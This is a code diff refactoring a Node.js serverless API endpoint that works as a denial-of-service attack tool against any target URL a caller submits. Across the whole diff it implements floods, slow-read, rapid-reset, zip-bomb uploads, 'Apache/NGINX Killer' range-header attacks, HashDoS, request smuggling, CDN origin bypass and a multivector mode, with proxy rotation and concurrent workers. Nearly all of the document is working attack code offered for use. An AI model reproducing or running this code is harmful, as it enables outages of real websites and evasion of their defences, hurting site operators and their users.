@@ -4,15 +4,13 @@ export const config = {
   api: {
     bodyParser: true,
     responseLimit: false,
-    // Vercel edge function? No, use serverless
   },
 }
 
-// Random helpers
+// ========== Random helpers ==========
 function randomInt(min, max) {
-  return Math.floor(Math.random() * (max - min + 1) + min)
+  return Math.floor(Math.random() * (max - min + 1)) + min
 }
-
 function randomChoice(arr) {
   return arr[Math.floor(Math.random() * arr.length)]
 }
@@ -49,49 +47,36 @@ function buildRequest(host, path, method, extraHeaders = {}, body = null) {
     'Cache-Control': randomChoice(cacheControl),
     ...extraHeaders
   }
-  
   const ref = randomChoice(referers)
   if (ref) headers['Referer'] = ref
-  
-  // Random path suffix
+
   const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000000, 9999999)
-  
-  const fetchOptions = {
-    method,
-    headers,
-  }
-  
+
+  const fetchOptions = { method, headers }
   if (body) {
     fetchOptions.body = body
     if (!headers['Content-Type']) headers['Content-Type'] = 'application/x-www-form-urlencoded'
   }
-  
+
   return { url: `https://${host}${finalPath}`, options: fetchOptions }
 }
 
-// Menjalankan satu request dengan retry
+// ========== Attacker functions ==========
 async function makeRequest(target, proxyAgent, reqBuilder) {
   const proto = target.startsWith('https') ? 'https' : 'http'
   const urlObj = new URL(target)
   const host = urlObj.host
   const path = urlObj.pathname + urlObj.search || '/'
-  
+
   const { url, options } = reqBuilder(host, path)
-  
-  // Gunakan proxy agent jika disediakan
-  if (proxyAgent) {
-    options.agent = proxyAgent
-  }
-  
+  if (proxyAgent) options.agent = proxyAgent
+
   try {
     const controller = new AbortController()
     const timeout = setTimeout(() => controller.abort(), 15000)
     options.signal = controller.signal
-    
     const response = await fetch(url, options)
     clearTimeout(timeout)
-    
-    // Baca minimal 1 byte (untuk slowread juga baca pelan-pelan)
     await response.text()
     return { success: true, status: response.status }
   } catch (err) {
@@ -99,197 +84,11 @@ async function makeRequest(target, proxyAgent, reqBuilder) {
   }
 }
 
-// Slow read: baca byte per byte dengan delay
-async function slowReadRequest(target, proxyAgent) {
-  const proto = target.startsWith('https') ? 'https' : 'http'
-  const urlObj = new URL(target)
-  const host = urlObj.host
-  const path = urlObj.pathname || '/'
-  const url = `${proto}://${host}${path}?rand=${randomInt(1000,9999)}`
-  
-  const options = {
-    method: 'GET',
-    headers: {
-      'Host': host,
-      'User-Agent': randomChoice(commonUserAgents),
-      'Connection': 'keep-alive',
-    },
-  }
-  if (proxyAgent) options.agent = proxyAgent
-  
-  try {
-    const controller = new AbortController()
-    setTimeout(() => controller.abort(), 30000)
-    options.signal = controller.signal
-    
-    const response = await fetch(url, options)
-    const reader = response.body.getReader()
-    // Baca chunk kecil dengan jeda
-    let bytesRead = 0
-    while (true) {
-      const { done, value } = await reader.read()
-      if (done) break
-      bytesRead += value.length
-      // Simulasi pembacaan lambat
-      await new Promise(resolve => setTimeout(resolve, 100))
-      if (bytesRead > 1000) break // Stop setelah baca 1KB
-    }
-    reader.cancel()
-    return { success: true }
-  } catch (err) {
-    return { success: false, error: err.message }
-  }
-}
-
-// Rapid reset: tutup koneksi tiba-tiba
-async function rapidResetRequest(target, proxyAgent) {
-  // Di Node.js kita tidak bisa mengirim RST, tapi kita bisa abort di tengah jalan
-  const proto = target.startsWith('https') ? 'https' : 'http'
-  const urlObj = new URL(target)
-  const host = urlObj.host
-  const url = `${proto}://${host}/?rand=${randomInt(1000,9999)}`
-  
-  const controller = new AbortController()
-  setTimeout(() => controller.abort(), 50) // abort setelah 50ms
-  
-  try {
-    const options = {
-      method: 'GET',
-      headers: { 'Host': host, 'User-Agent': randomChoice(commonUserAgents) },
-      signal: controller.signal,
-    }
-    if (proxyAgent) options.agent = proxyAgent
-    await fetch(url, options)
-    return { success: true }
-  } catch {
-    // Abort error tetap dianggap "request sent"
-    return { success: true }
-  }
-}
-
-// Zip bomb: kirim body gzip palsu
-function generateZipBomb() {
-  // Gzip file yang akan mengembang besar (10MB kecil)
-  const deflate = require('zlib').deflateSync
-  const gunzip = require('zlib').gunzipSync
-  // Generate 10MB data berulang 'A' lalu kompres
-  const data = Buffer.alloc(10 * 1024 * 1024, 'A')
-  return deflate(data)
-}
-
-const zipBombPayload = (() => {
-  try {
-    return generateZipBomb().toString('base64')
-  } catch {
-    return null
-  }
-})()
-
-async function sendZipBomb(target, proxyAgent) {
-  if (!zipBombPayload) return { success: false, error: 'Failed to generate zip bomb' }
-  const urlObj = new URL(target)
-  const host = urlObj.host
-  const url = `${target.startsWith('https') ? 'https' : 'http'}://${host}/upload?rand=${randomInt(1000,9999)}`
-  
-  const options = {
-    method: 'POST',
-    headers: {
-      'Host': host,
-      'User-Agent': randomChoice(commonUserAgents),
-      'Content-Encoding': 'gzip',
-      'Content-Type': 'application/octet-stream',
-      'Content-Length': Buffer.from(zipBombPayload, 'base64').length.toString(),
-    },
-    body: Buffer.from(zipBombPayload, 'base64'),
-  }
-  if (proxyAgent) options.agent = proxyAgent
-  
-  try {
-    const controller = new AbortController()
-    setTimeout(() => controller.abort(), 30000)
-    options.signal = controller.signal
-    await fetch(url, options)
-    return { success: true }
-  } catch (err) {
-    return { success: false, error: err.message }
-  }
-}
-
-// Apache Killer: banyak Range header
-function apacheKillerReq(host, path) {
-  const ranges = []
-  for (let i = 0; i < 20; i++) {
-    const start = randomInt(0, 5000)
-    const end = start + randomInt(100, 500)
-    ranges.push(`${start}-${end}`)
-  }
-  const rangeHeader = `bytes=${ranges.join(',')}`
-  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
-  return {
-    url: `https://${host}${finalPath}`,
-    options: {
-      method: 'GET',
-      headers: {
-        'Host': host,
-        'User-Agent': randomChoice(commonUserAgents),
-        'Range': rangeHeader,
-        'Connection': 'keep-alive',
-      },
-    },
-  }
-}
-
-// NGINX Killer: overlapping range with long host
-function nginxKillerReq(host, path) {
-  const ranges = []
-  for (let i = 0; i < 40; i++) {
-    const start = randomInt(0, 5000)
-    const end = start + randomInt(100, 1000)
-    ranges.push(`${start}-${end}`)
-  }
-  const rangeHeader = `bytes=${ranges.join(',')}`
-  const longHost = host + 'a'.repeat(randomInt(500, 2000)) // fake host panjang
-  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
-  return {
-    url: `https://${host}${finalPath}`, // tetap pakai host asli di URL
-    options: {
-      method: 'GET',
-      headers: {
-        'Host': longHost,
-        'User-Agent': randomChoice(commonUserAgents),
-        'Range': rangeHeader,
-        'Connection': 'keep-alive',
-      },
-    },
-  }
-}
-
-// Pipeline: kirim beberapa request dalam satu koneksi (simulasi)
-async function pipelineRequest(target, proxyAgent) {
-  const urlObj = new URL(target)
-  const host = urlObj.host
-  // Dengan fetch tidak bisa multiplexing manual, jadi kita kirim burst 3 request cepat
-  for (let i = 0; i < 3; i++) {
-    const { url, options } = buildRequest(host, urlObj.pathname, 'GET')
-    if (proxyAgent) options.agent = proxyAgent
-    try {
-      const controller = new AbortController()
-      setTimeout(() => controller.abort(), 5000)
-      options.signal = controller.signal
-      await fetch(url, options)
-    } catch {}
-  }
-  return { success: true }
-}
-
-// HashDoS: POST dengan banyak parameter array
 async function hashDosRequest(target, proxyAgent) {
   const urlObj = new URL(target)
   const host = urlObj.host
   const params = []
-  for (let i = 0; i < 1000; i++) {
-    params.push(`a[]=${i}`)
-  }
+  for (let i = 0; i < 1000; i++) params.push(`a[]=${i}`)
   const body = params.join('&')
   const url = `${target.startsWith('https') ? 'https' : 'http'}://${host}/login?rand=${randomInt(1000,9999)}`
   const options = {
@@ -314,7 +113,148 @@ async function hashDosRequest(target, proxyAgent) {
   }
 }
 
-// Cache poison: request dengan Cache-Control: no-cache
+async function slowReadRequest(target, proxyAgent) {
+  const proto = target.startsWith('https') ? 'https' : 'http'
+  const urlObj = new URL(target)
+  const host = urlObj.host
+  const path = urlObj.pathname || '/'
+  const url = `${proto}://${host}${path}?rand=${randomInt(1000,9999)}`
+  const options = {
+    method: 'GET',
+    headers: {
+      'Host': host,
+      'User-Agent': randomChoice(commonUserAgents),
+      'Connection': 'keep-alive',
+    },
+  }
+  if (proxyAgent) options.agent = proxyAgent
+  try {
+    const controller = new AbortController()
+    setTimeout(() => controller.abort(), 30000)
+    options.signal = controller.signal
+    const response = await fetch(url, options)
+    const reader = response.body.getReader()
+    let bytesRead = 0
+    while (true) {
+      const { done, value } = await reader.read()
+      if (done) break
+      bytesRead += value.length
+      await new Promise(resolve => setTimeout(resolve, 100))
+      if (bytesRead > 1000) break
+    }
+    reader.cancel()
+    return { success: true }
+  } catch {
+    return { success: false }
+  }
+}
+
+async function rapidResetRequest(target, proxyAgent) {
+  const proto = target.startsWith('https') ? 'https' : 'http'
+  const urlObj = new URL(target)
+  const host = urlObj.host
+  const url = `${proto}://${host}/?rand=${randomInt(1000,9999)}`
+  const controller = new AbortController()
+  setTimeout(() => controller.abort(), 50)
+  try {
+    const options = {
+      method: 'GET',
+      headers: { 'Host': host, 'User-Agent': randomChoice(commonUserAgents) },
+      signal: controller.signal,
+    }
+    if (proxyAgent) options.agent = proxyAgent
+    await fetch(url, options)
+    return { success: true }
+  } catch {
+    return { success: true } // abort masih dihitung sukses mengirim request
+  }
+}
+
+function generateZipBomb() {
+  try {
+    const { deflateSync } = require('zlib')
+    const data = Buffer.alloc(10 * 1024 * 1024, 'A')
+    return deflateSync(data).toString('base64')
+  } catch {
+    return null
+  }
+}
+const zipBombPayload = generateZipBomb()
+
+async function sendZipBomb(target, proxyAgent) {
+  if (!zipBombPayload) return { success: false, error: 'Failed to generate zip bomb' }
+  const urlObj = new URL(target)
+  const host = urlObj.host
+  const url = `${target.startsWith('https') ? 'https' : 'http'}://${host}/upload?rand=${randomInt(1000,9999)}`
+  const body = Buffer.from(zipBombPayload, 'base64')
+  const options = {
+    method: 'POST',
+    headers: {
+      'Host': host,
+      'User-Agent': randomChoice(commonUserAgents),
+      'Content-Encoding': 'gzip',
+      'Content-Type': 'application/octet-stream',
+      'Content-Length': body.length.toString(),
+    },
+    body,
+  }
+  if (proxyAgent) options.agent = proxyAgent
+  try {
+    const controller = new AbortController()
+    setTimeout(() => controller.abort(), 30000)
+    options.signal = controller.signal
+    await fetch(url, options)
+    return { success: true }
+  } catch {
+    return { success: false }
+  }
+}
+
+function apacheKillerReq(host, path) {
+  const ranges = []
+  for (let i = 0; i < 20; i++) {
+    const start = randomInt(0, 5000)
+    const end = start + randomInt(100, 500)
+    ranges.push(`${start}-${end}`)
+  }
+  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
+  return {
+    url: `https://${host}${finalPath}`,
+    options: {
+      method: 'GET',
+      headers: {
+        'Host': host,
+        'User-Agent': randomChoice(commonUserAgents),
+        'Range': `bytes=${ranges.join(',')}`,
+        'Connection': 'keep-alive',
+      },
+    },
+  }
+}
+
+function nginxKillerReq(host, path) {
+  const ranges = []
+  for (let i = 0; i < 40; i++) {
+    const start = randomInt(0, 5000)
+    const end = start + randomInt(100, 1000)
+    ranges.push(`${start}-${end}`)
+  }
+  const longHost = host + 'a'.repeat(randomInt(500, 2000))
+  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
+  return {
+    url: `https://${host}${finalPath}`,
+    options: {
+      method: 'GET',
+      headers: {
+        'Host': longHost,
+        'User-Agent': randomChoice(commonUserAgents),
+        'Range': `bytes=${ranges.join(',')}`,
+        'Connection': 'keep-alive',
+      },
+    },
+  }
+}
+
 function cachePoisonReq(host, path) {
   const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
   return {
@@ -332,11 +272,10 @@ function cachePoisonReq(host, path) {
   }
 }
 
-// Origin bypass: kirim dengan host asli tapi IP target
 function originBypassReq(targetIP, host, path) {
   const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
   return {
-    url: `https://${targetIP}${finalPath}`, // langsung ke IP
+    url: `https://${targetIP}${finalPath}`,
     options: {
       method: 'GET',
       headers: {
@@ -347,6 +286,23 @@ function originBypassReq(targetIP, host, path) {
   }
 }
 
+async function pipelineRequest(target, proxyAgent) {
+  const urlObj = new URL(target)
+  const host = urlObj.host
+  for (let i = 0; i < 3; i++) {
+    const { url, options } = buildRequest(host, urlObj.pathname, 'GET')
+    if (proxyAgent) options.agent = proxyAgent
+    try {
+      const controller = new AbortController()
+      setTimeout(() => controller.abort(), 5000)
+      options.signal = controller.signal
+      await fetch(url, options)
+    } catch {}
+  }
+  return { success: true }
+}
+
+// ========== Main handler ==========
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method Not Allowed' })
@@ -358,7 +314,6 @@ export default async function handler(req, res) {
     return res.status(400).json({ error: 'Target required' })
   }
 
-  // Parse target
   let targetUrl
   try {
     targetUrl = new URL(target)
@@ -368,8 +323,7 @@ export default async function handler(req, res) {
 
   const useProxy = proxies && proxies.length > 0
   let proxyIndex = 0
-  
-  // Set headers untuk SSE-like streaming
+
   res.setHeader('Content-Type', 'text/plain; charset=utf-8')
   res.setHeader('Transfer-Encoding', 'chunked')
   res.setHeader('X-Content-Type-Options', 'nosniff')
@@ -386,19 +340,15 @@ export default async function handler(req, res) {
     res.write(`data:${JSON.stringify({ total, success, failed, rps, elapsed: Math.round(elapsed) })}\n\n`)
   }
 
-  // Worker function
   async function worker() {
     while (Date.now() < endTime) {
-      // Pilih proxy jika digunakan
       let proxyAgent = null
       if (useProxy) {
         const proxy = proxies[proxyIndex % proxies.length]
         proxyIndex++
         try {
           proxyAgent = new HttpsProxyAgent(proxy)
-        } catch {
-          // Proxy invalid, lanjut tanpa proxy
-        }
+        } catch {}
       }
 
       let result
@@ -418,7 +368,6 @@ export default async function handler(req, res) {
           const host = urlObj.host
           const path = urlObj.pathname || '/'
           const finalPath = path + '?rand=' + randomInt(1000,9999)
-          // Smuggle dengan Transfer-Encoding chunked
           const smuggledBody = '0\r\n\r\nSMUGGLED'
           const smuggleReq = {
             url: `https://${host}${finalPath}`,
@@ -437,8 +386,8 @@ export default async function handler(req, res) {
           try {
             await fetch(smuggleReq.url, smuggleReq.options)
             result = { success: true }
-          } catch (err) {
-            result = { success: false, error: err.message }
+          } catch {
+            result = { success: false }
           }
           break
         }
@@ -450,9 +399,8 @@ export default async function handler(req, res) {
             else failed++
             total++
           }
-          // Jeda antara burst
           await new Promise(resolve => setTimeout(resolve, randomInt(50, 200)))
-          continue // skip increment di bawah
+          continue
         }
         case 'zipbomb':
           result = await sendZipBomb(target, proxyAgent)
@@ -467,26 +415,21 @@ export default async function handler(req, res) {
           const urlObj = new URL(target)
           const host = urlObj.host
           const path = urlObj.pathname || '/'
-          // Asumsi user tahu origin IP, kita pakai target apa adanya sebagai IP
           const originIP = target.replace(/https?:\/\//, '').split('/')[0].split(':')[0]
           const { url, options } = originBypassReq(originIP, host, path)
           if (proxyAgent) options.agent = proxyAgent
           try {
             await fetch(url, options)
             result = { success: true }
-          } catch (err) {
-            result = { success: false, error: err.message }
+          } catch {
+            result = { success: false }
           }
           break
         }
         case 'tlsflood': {
-          // Cukup membuat koneksi HTTPS lalu tutup
           const urlObj = new URL(target)
           const host = urlObj.host
-          const options = {
-            method: 'GET',
-            headers: { 'Host': host },
-          }
+          const options = { method: 'GET', headers: { 'Host': host } }
           if (proxyAgent) options.agent = proxyAgent
           try {
             const controller = new AbortController()
@@ -495,7 +438,7 @@ export default async function handler(req, res) {
             await fetch(`https://${host}/?rand=${randomInt(1000,9999)}`, options)
             result = { success: true }
           } catch {
-            result = { success: true } // handshake sukses walaupun timeout
+            result = { success: true }
           }
           break
         }
@@ -506,8 +449,8 @@ export default async function handler(req, res) {
           try {
             await fetch(url, options)
             result = { success: true }
-          } catch (err) {
-            result = { success: false, error: err.message }
+          } catch {
+            result = { success: false }
           }
           break
         }
@@ -518,8 +461,8 @@ export default async function handler(req, res) {
           try {
             await fetch(url, options)
             result = { success: true }
-          } catch (err) {
-            result = { success: false, error: err.message }
+          } catch {
+            result = { success: false }
           }
           break
         }
@@ -530,8 +473,8 @@ export default async function handler(req, res) {
           try {
             await fetch(url, options)
             result = { success: true }
-          } catch (err) {
-            result = { success: false, error: err.message }
+          } catch {
+            result = { success: false }
           }
           break
         }
@@ -541,7 +484,6 @@ export default async function handler(req, res) {
         case 'multivector': {
           const methods = ['flood', 'hashdos', 'rapidreset', 'nginxkiller', 'tlsflood']
           const chosen = methods[Math.floor(Math.random() * methods.length)]
-          // Rekursif sederhana: panggil worker lagi dengan method berbeda
           switch (chosen) {
             case 'flood': result = await makeRequest(target, proxyAgent, buildRequest); break
             case 'hashdos': result = await hashDosRequest(target, proxyAgent); break
@@ -549,7 +491,7 @@ export default async function handler(req, res) {
             case 'nginxkiller': {
               const urlObj = new URL(target)
               const { url, options } = nginxKillerReq(urlObj.host, urlObj.pathname)
-              try { await fetch(url, options); result = { success: true } } catch (err) { result = { success: false } }
+              try { await fetch(url, options); result = { success: true } } catch { result = { success: false } }
               break
             }
             case 'tlsflood': {
@@ -569,34 +511,22 @@ export default async function handler(req, res) {
       else failed++
       total++
 
-      // Kirim stats periodik
-      if (total % 10 === 0) {
-        sendStats()
-      }
-
-      // Delay kecil antar request (jangan terlalu cepat memenuhi event loop)
+      if (total % 10 === 0) sendStats()
       await new Promise(resolve => setTimeout(resolve, 10))
     }
   }
 
-  // Jalankan workers
-  const workerPromises = []
+  const workers = []
   for (let i = 0; i < threads; i++) {
-    workerPromises.push(worker())
+    workers.push(worker())
   }
 
-  // Send stats setiap detik
-  const statsInterval = setInterval(() => {
-    sendStats()
-  }, 1000)
+  const statsInterval = setInterval(sendStats, 1000)
 
-  await Promise.all(workerPromises)
+  await Promise.all(workers)
   clearInterval(statsInterval)
 
-  // Final stats
   sendStats()
-  
-  // Kirim data final sebagai JSON biasa juga
   res.write(`data:${JSON.stringify({ total, success, failed, duration: Math.round((Date.now() - startTime) / 1000), final: true })}\n\n`)
   res.end()
 }
